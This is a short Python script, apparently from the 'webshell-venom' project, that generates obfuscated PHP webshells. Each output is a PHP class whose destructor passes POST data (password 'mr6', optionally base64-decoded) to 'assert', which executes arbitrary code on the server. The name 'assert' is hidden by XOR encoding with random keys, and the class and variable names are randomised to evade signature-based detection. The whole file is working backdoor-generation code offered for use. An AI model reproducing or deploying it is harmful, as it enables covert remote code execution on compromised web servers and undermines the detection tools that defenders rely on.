import random

#author: yzddmr6
#github: https://github.com/yzddmr6/webshell-venom/

passwd='mr6'
func = 'assert'
shell = '''<?php 
class  {0}{2}
${1}=new {0}();
@${1}->mr6test=isset($_GET['id'])?base64_decode($_POST['{3}']):$_POST['{3}'];
?>'''

def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

    
def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
    
def xor(c1,c2):
    return hex(ord(c1)^ord(c2)).replace('0x',r"\x")

def random_payload():
    func_line = ''
    name_tmp=[]
    for i in range(len(func)):
        name_tmp.append(random_name(3).lower())
    key = random_keys(len(func))
    fina=random_name(4)
    call = '${0}='.format(fina)
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line += "${0}='{1}'^\"{2}\";".format(name_tmp[i],key[i],enc)
        func_line += '\n'
        call += '${0}.'.format(name_tmp[i])
    func_line = func_line.rstrip('\n')
    #print(func_line)
    call = call.rstrip('.') + ';'
    func_name=random_name(4)
    func_tmpl = '''{ 
function %s(){
%s
%s
return $%s;}''' % (func_name,func_line,call,fina)
    func_tmp2='function __destruct(){'+'''
${0}=$this->{1}();
@${0}($this->mr6test);'''.format(random_name(4),func_name)+'}}'

    return func_tmpl+func_tmp2

    
def build_webshell():
    className = random_name(4)
    objName = className.lower()
    payload = random_payload()
    shellc = shell.format(className,objName,payload,passwd).replace('mr6test',random_name(2))
    return shellc
    
if __name__ == '__main__':
    print (build_webshell())